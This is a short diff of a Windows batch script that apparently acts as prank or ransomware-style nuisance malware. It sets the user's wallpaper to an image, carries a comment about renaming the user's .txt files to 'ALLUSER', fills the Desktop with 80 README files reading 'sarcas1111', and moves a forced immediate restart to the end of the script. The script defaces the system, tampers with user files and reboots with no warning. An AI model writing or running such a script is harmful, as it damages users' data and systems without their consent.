@@ -7,9 +7,6 @@ set img=%USERPROFILE%\Music\GD_001.jpg
 
 reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%img%" /f >nul 2>&1
 
-shutdown /r /t 0
-
-
 :: rename *.txt menjadi ALLUSER
 setlocal enabledelayedexpansion
 
@@ -31,3 +28,6 @@ setlocal enabledelayedexpansion
 for /l %%i in (1,1,80) do (
     echo sarcas1111 > "%USERPROFILE%\Desktop\README%%i.txt"
 )
+
+::restart
+shutdown /r /t 0
